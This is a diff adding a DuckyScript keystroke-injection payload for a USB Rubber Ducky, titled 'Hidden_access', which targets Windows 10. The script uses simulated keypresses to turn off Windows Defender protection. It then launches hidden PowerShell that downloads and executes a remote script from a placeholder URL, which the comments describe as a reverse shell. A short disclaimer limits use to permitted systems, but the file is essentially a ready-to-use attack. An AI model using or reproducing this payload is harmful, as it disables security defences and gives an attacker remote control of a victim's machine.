@@ -1,0 +1,32 @@
+
+REM Author: makozort Title: Hidden_access Target: windows 10 Description: gain a reverse shell to targets pc, the script works VERY qucikly agains machines with disabled defender
+REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
+DELAY 1000
+CTRL ESC
+DELAY 300
+REM this block disables windows defender, delete it if you dont need to. target may have varibles that mean you need to change how many times "TAB" is hit
+STRING windows security
+DELAY 300
+ENTER
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 600
+SPACE
+DELAY 600
+LEFT
+ENTER
+DELAY 300
+ALT F4
+GUI r
+DELAY 600
+REM open up powershell in hidden mode, run the command (the rs.ps1 that needs to be edited )you have already uploaded somewhere so that the ducky does not have to type it all out
+STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('LINK HERE');
+ENTER
+DELAY 600
+LEFT ENTER
